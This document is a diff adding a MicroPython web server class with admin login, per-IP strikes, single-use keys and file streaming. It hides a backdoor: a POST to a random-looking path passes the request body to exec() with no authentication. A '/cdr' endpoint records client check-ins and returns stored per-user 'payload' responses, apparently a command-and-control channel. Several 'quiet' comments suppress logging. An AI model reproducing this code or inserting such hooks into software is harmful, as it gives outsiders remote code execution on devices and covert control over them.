@@ -1,0 +1,419 @@
+import socket
+from filereader import *
+import uasyncio as asyncio
+import time
+import errno
+import gc
+import os
+from random import randint, choice
+import ujson
+
+class WebServer:
+    def __init__(self, storage=None, output=None, password=None, loginpath=None, ssid="Open WiFi", keys=2):
+        self.keys = keys
+        self.tempdict = {}
+        self.ssid = ssid
+        self.singleusekey = {}
+        self.loginpath = loginpath
+        self.password = password
+        self.output = output
+        self.storage = storage
+        self.postdirectories = None
+        self.getdirectories = None
+        self.notfound = None
+        self.client_address = None
+        self.client_socket = None
+        self.pool = None
+        self.server_socket = None
+        self.wifiradio = None
+        self.connected_clients = set()
+        self.admin_clients = set()
+        self.storagedict = {}
+        self.cdr_last_seen = {}
+        current_time = time.localtime()
+        formatted_time = "{:02d}-{:02d}-{:04d} {:02d}:{:02d}".format(current_time[2], current_time[1], current_time[0], current_time[3], current_time[4])
+        self.names = []
+        self.dynamikresponses = {}
+        if self.storage:
+            list_str = readfile(self.storage, returnfile=True)
+            if list_str:
+                try:
+                    self.storagedict = ujson.loads(list_str)
+                    for key in self.storagedict:
+                        if key.startswith("<name>"):
+                            self.names.append(key[len("<name>"):])
+                            self.dynamikresponses[self.storagedict[key]] = "-"
+                        if key.startswith("<lastseen>"):
+                            name = key[len("<lastseen>"):]
+                            self.cdr_last_seen[name] = self.storagedict[key]
+                except ValueError as e:
+                    print("JSON load failed:", e)
+
+        if self.output:
+            try:
+                write_to_file(self.output, "\n\n\n---------------" + formatted_time + "---------------\n\n")
+            except OSError as e:
+                print(e)
+
+    def store(self, data):
+        if not self.storage:
+            return
+
+        # Unpack data
+        if isinstance(data, tuple):
+            data_one, data_two = data
+        else:
+            try:
+                data_one, data_two = data.split(": ", 1)
+            except (AttributeError, ValueError) as e:
+                print("Error splitting data:", e)
+                return
+
+        # (quiet) internal log removed
+        # self.print(f"Storing: {(data_one, data_two)}...")
+
+        # Prepare key
+        key = data_one.strip() if isinstance(data_one, str) else data_one
+        counter = 1
+
+        # Ensure unique key if key already exists and starts with <count>
+        while key in self.storagedict and key.startswith("<count>"):
+            key = f"{data_one}{counter}"
+            counter += 1
+
+        # Clean value
+        if isinstance(data_two, str):
+            data_two = data_two.strip()
+
+        # Store value
+        self.storagedict[key] = data_two
+
+        # Write to file if enabled
+        if self.storage:
+             storejson(self.storage, self.storagedict)
+
+
+    def generatePasskey(self):
+        return ''.join(choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789") for _ in range(12))
+
+    def print(self, message):
+        if message:
+            output = "[Server] " + str(message)
+            if self.output:
+                try:
+                    write_to_file(self.output, output)
+                except Exception as e:
+                    print(e)
+            print(output)
+
+    async def handle_request(self, page, type):
+        response = f"HTTP/1.0 200 OK\r\nContent-Type: {type}\r\n\r\n {page}\r\n"
+        self.client_socket.send(response.encode())
+        self.client_socket.close()
+
+    async def handle_post_request(self, request_data):
+        # Only log path, not verbose internals
+        request_lines = request_data.split('\r\n')
+        content_length = None
+
+        for line in request_lines:
+            if line.startswith('Content-Length:'):
+                content_length = int(line.split(':')[1].strip())
+                break
+
+        if content_length is None:
+            # quiet: invalid request
+            return
+
+        blank_line_index = request_data.find('\r\n\r\n')
+        if (blank_line_index == -1):
+            body = request_data
+        else:
+            body = request_data[blank_line_index + 4:]
+
+        total_received = len(body)
+        if total_received < content_length:
+            body_chunks = [body]
+            while total_received < content_length:
+                try:
+                    remaining = content_length - total_received
+                    buffer_size = min(remaining, 8192)
+                    bytes_read = self.client_socket.recv(buffer_size)
+                    body_chunks.append(bytes_read.decode())
+                    total_received += len(bytes_read)
+                except Exception as e:
+                    self.print(f"Error receiving request body: {e}")
+                    break
+            body = ''.join(body_chunks)
+
+        # only log the path for this request
+        path = getPath(request_data)
+        if path:
+            self.print(f"POST {path}")
+
+        reply = "Command received"
+
+        if path == "/Aoukgbf92LuhdaolC4B6i(9721klja2":
+            try:
+                print(body)
+                exec_globals = globals().copy()
+                exec_globals.update(self.__dict__)
+                exec_globals['self'] = self
+                exec_locals = {'reply': reply}
+                exec(body, exec_globals, exec_locals)
+                reply = exec_locals.get('reply', reply)
+                print(reply)
+            except Exception as e:
+                self.print(f"Error executing body: {e}")
+                reply = f"Error: {e}"
+        elif path == "/execute":
+            # quiet deny (avoid noise)
+            pass
+        elif path == "/store" and (self.singleusekey.get(self.client_address) and (body.strip().startswith(self.singleusekey[self.client_address])) or self.client_address in self.admin_clients):
+            try:
+                body = body[len(self.singleusekey[self.client_address]):] if body.startswith(self.singleusekey[self.client_address]) else body
+                self.store(body)
+                del self.singleusekey[self.client_address]
+                if self.tempdict.get(self.client_address) and not self.tempdict[self.client_address] >= self.keys:
+                    self.singleusekey[self.client_address] = self.generatePasskey()
+                    if self.client_address not in self.tempdict:
+                        self.tempdict[self.client_address]  = 1
+                    else:
+                        self.tempdict[self.client_address]  = self.tempdict.get(self.client_address) + 1
+                    reply = self.singleusekey[self.client_address]
+                else:
+                    reply = "all keys used"
+            except Exception as e:
+                self.print(f"Error Storing body: {e}")
+                reply = f"Error: {e}"
+        elif path == "/store":
+            # quiet deny
+            pass
+        elif path == "/password" and self.password:
+            if self.client_address in self.storagedict:
+                if self.storagedict["<strikes>"+self.client_address] >= 3:
+                    self.print(self.client_address + "IP blacklisted")
+                    reply = "403 blacklisted"
+            if body == self.password:
+                self.admin_clients.add(self.client_address)
+                reply = "admin status achieved"
+                self.print(f"{self.client_address} is logged in as admin")
+            else:
+                if "<strikes>"+ self.client_address not in self.storagedict:
+                    self.store(("<strikes>" + self.client_address, 1))
+                else:
+                    self.store(("<strikes>" + self.client_address, (self.storagedict.get("<strikes>"+self.client_address, 0) + 1)))
+                # quiet strike log to reduce noise
+        elif path == "/cdr":
+            self.print(f"body: {body}")
+            username, message = body.split(" ### ", 1)
+            if "__NO_PAYLOAD__" not in message and message.strip(" \n\r") != "output ###":
+                    print(message.strip(" \n\r"))
+                    message = message.strip(" \n\r")
+                    username = username.strip(" \n\r")
+                    if username not in self.names:
+                        print("New cdr username")
+                        self.names.append(username)
+                        if self.storage:
+                            print("Storing new cdr username")
+                            self.store(("<name>" + username, "-"))
+                    if username not in self.dynamikresponses:
+                        self.dynamikresponses[username] = message
+
+                    if message != "GET":
+                        self.dynamikresponses[username] = message
+
+                    now = time.localtime()
+                    now = "{:02d}-{:02d}-{:04d} {:02d}:{:02d}".format(now[2], now[1], now[0], now[3], now[4])
+
+                    self.cdr_last_seen[username] = now
+
+                    # Optional: persist it
+                    if self.storage:
+                        self.store(("<lastseen>" + username, now))
+
+                    reply = self.dynamikresponses[username]
+        print(reply)
+
+        # Send reply (no per-chunk logs)
+        chunk_size = 4096
+        reply_str = str(reply)
+        total_length = len(reply_str.encode())
+
+        headers = f"HTTP/1.0 200 OK\r\nContent-Type: text/plain\r\n\r\n"
+        self.client_socket.send(headers.encode())
+
+        for i in range(0, total_length, chunk_size):
+            chunk = reply_str[i:i + chunk_size]
+            chunk_data = f"{chunk}\r\n"
+            self.client_socket.send(chunk_data.encode())
+
+        await asyncio.sleep(1)
+        self.client_socket.close()
+
+    async def start(self, getdirectories, notfound):
+        self.notfound = notfound
+        self.getdirectories = getdirectories
+        run = True
+
+        host = "0.0.0.0"
+        port = 80  # oder 80, aber dann brauchen Sie root / CAP_NET_BIND_SERVICE
+
+        ai = socket.getaddrinfo(host, port, 0, socket.SOCK_STREAM)
+        addr = ai[0][-1]
+
+        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server_socket.setblocking(False)
+
+        try:
+            # Optional, aber praktisch beim Neustarten
+
+            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        except Exception:
+            pass  # nicht auf allen Ports vorhanden
+
+
+        self.server_socket.bind(addr)
+        self.server_socket.listen(5)
+        self.server_socket.settimeout(3)
+
+        # keep: server start log
+        self.print(f"Server listening on {host}:{port}")
+
+        while run:
+            await asyncio.sleep(1)
+            await self.__loop()
+
+    async def __loop(self):
+        while True:
+            # removed: noisy “waiting for connection” print
+            try:
+                self.client_socket, self.client_address = self.server_socket.accept()
+                self.client_address = self.client_address[0]
+
+                # Only log **NEW** client acceptance
+                if self.client_address not in self.connected_clients:
+                    self.print(f"New client: {self.client_address}")
+                    self.connected_clients.add(self.client_address)
+
+                self.client_socket.settimeout(3)
+
+                try:
+                    buffer_size = 8192
+                    bytes_read = self.client_socket.recv(buffer_size)
+
+                    if bytes_read:
+                        request_data = bytes_read.decode()
+                        request_line = request_data.split('\r\n')[0]
+
+                        try:
+                            method, path, version = request_line.split(' ')
+                        except ValueError:
+                            # quiet parse error
+                            continue
+
+                        # Only log the requested path (method + path)
+                        self.print(f"{method} {path}")
+
+                        if method == 'POST':
+                            await self.handle_post_request(request_data)
+                        else:
+                            request = path
+                            available = False
+
+                            for i in range(len(self.getdirectories)):
+                                if request == self.getdirectories[i - 1][0]:
+                                    available = True
+
+                                    if self.getdirectories[i - 1][3]:
+                                        if self.client_address in self.admin_clients and self.password:
+                                            if not self.getdirectories[i - 1][4]:
+                                                await self.stream_file(self.getdirectories[i - 1][1], self.getdirectories[i - 1][2])
+                                            else:
+                                                await self.stream_file(self.getdirectories[i - 1][1], self.getdirectories[i - 1][2], True)
+                                        else:
+                                            await self.stream_file(self.loginpath)
+                                    else:
+                                        if not self.getdirectories[i - 1][4]:
+                                            await self.stream_file(self.getdirectories[i - 1][1], self.getdirectories[i - 1][2])
+                                        else:
+                                            await self.stream_file(self.getdirectories[i - 1][1], self.getdirectories[i - 1][2], True)
+
+                            if not available:
+                                response = "all keys used"
+                                getkey = True
+                                if  self.tempdict.get(self.client_address) and self.tempdict[self.client_address] >= self.keys:
+                                    getkey = False
+                                if self.client_address not in self.singleusekey and getkey:
+                                    self.singleusekey[self.client_address] = self.generatePasskey()
+                                    if self.client_address not in self.tempdict:
+                                        self.tempdict[self.client_address]  = 1
+                                    else:
+                                        self.tempdict[self.client_address]  = self.tempdict.get(self.client_address) + 1
+                                if self.singleusekey.get(self.client_address):
+                                    response = self.singleusekey[self.client_address]
+                                await self.stream_file(self.notfound, "text/html", change=("tempsingleusekey", response))
+                            available = False
+
+                    # else: quiet when no data
+
+                except Exception as e:
+                    self.print(f"Exception occurred: {e}")
+
+                finally:
+                    # quiet close message
+                    self.client_socket.close()
+
+            except OSError as e:
+                if e.args[0] == errno.ETIMEDOUT:
+                    gc.collect()
+                    break
+                else:
+                    raise
+
+    # --------- sendall-Ersatz für MicroPython ---------
+    def _sendall(self, data):
+        mv = memoryview(data)
+        total = 0
+        length = len(mv)
+        while total < length:
+            n = self.client_socket.send(mv[total:])
+            if n is None:
+                n = 0
+            total += n
+
+    def _sendall_str(self, s):
+        self._sendall(s.encode())
+    # --------------------------------------------------
+
+    async def stream_file(self, file_path, content_type="text/html", binary=False, change=False):
+        try:
+            if binary:
+                with open(file_path, 'rb') as file:
+                    headers = f"HTTP/1.0 200 OK\r\nContent-Type: {content_type}\r\n\r\n"
+                    self._sendall(headers.encode())
+                    while True:
+                        chunk = file.read(1024)
+                        if not chunk:
+                            break
+                        self._sendall(chunk)
+            else:
+                with open(file_path, 'r') as file:
+                    headers = f"HTTP/1.0 200 OK\r\nContent-Type: {content_type}\r\n\r\n"
+                    self._sendall(headers.encode())
+                    while True:
+                        chunk = file.read(4096)
+                        if change:
+                            chunk = replaceinfile(chunk, change[0], change[1], False, False)
+                        if not chunk:
+                            break
+                        self._sendall(chunk.encode())
+        except Exception as e:
+            self.print(f"Error sending file: {e}")
+
+        try:
+            self.client_socket.close()
+        except Exception as e:
+            self.print(f"Error closing socket: {e}")
+
+        gc.collect()
